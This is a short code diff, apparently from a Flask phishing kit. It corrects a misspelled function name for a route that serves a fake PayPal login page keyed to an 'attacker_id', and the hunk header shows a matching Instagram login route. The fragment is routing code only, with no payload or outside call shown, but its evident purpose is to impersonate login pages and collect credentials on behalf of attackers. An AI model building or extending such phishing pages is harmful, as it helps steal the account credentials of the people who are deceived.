@@ -31,7 +31,7 @@ def instgram_login(attacker_id):
 
 
 @app.route('/paypal-login/<attacker_id>')
-def paypla_login(attacker_id):
+def paypal_login(attacker_id):
     return render_template('paypal.html', attacker_id=attacker_id)
 
 
